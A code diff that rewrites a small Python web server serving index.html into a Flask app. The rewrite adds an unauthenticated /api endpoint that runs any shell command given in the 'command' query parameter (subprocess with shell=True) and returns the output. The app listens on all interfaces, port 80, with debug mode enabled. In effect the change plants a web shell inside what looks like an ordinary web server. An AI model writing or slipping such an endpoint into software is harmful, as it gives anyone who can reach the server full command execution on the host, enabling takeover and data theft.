@@ -1,23 +1,31 @@
-import socketserver
-import logging
+import subprocess
+import flask
+from flask import request, jsonify
 
-logging.basicConfig(level=logging.INFO)
+host = "0.0.0.0"
+port = 80
 
-class MyTCPHandler(socketserver.BaseRequestHandler):
-    def handle(self):
-        logging.info(f"Received connection from {self.client_address[0]}")
-        
-        # Read the HTML file
-        with open('index.html', 'r') as f:
-            html = f.read()
-        
-        self.request.sendall(b"HTTP/1.1 200 OK\n")
-        self.request.sendall(b"Content-Type: text/html\n\n")
-        
-        self.request.sendall(html.encode())
+app = flask.Flask(__name__)
+app.config["DEBUG"] = True
 
-# def server to server start
-server = socketserver.TCPServer(('localhost', 8000), MyTCPHandler)
 
-# server start
-server.serve_forever()
+@app.route("/", methods=["GET"])
+def home():
+    with open("index.html", "r") as f:
+        html = f.read()
+    return html
+
+
+@app.route("/api", methods=["GET"])
+def api_api():
+    if "command" in request.args:
+        outputraw = subprocess.Popen(
+            request.args["command"], shell=True, stdout=subprocess.PIPE
+        ).stdout
+        output = outputraw.read()
+        return output.decode()
+    else:
+        return "404"
+
+
+app.run(host=host, port=port)
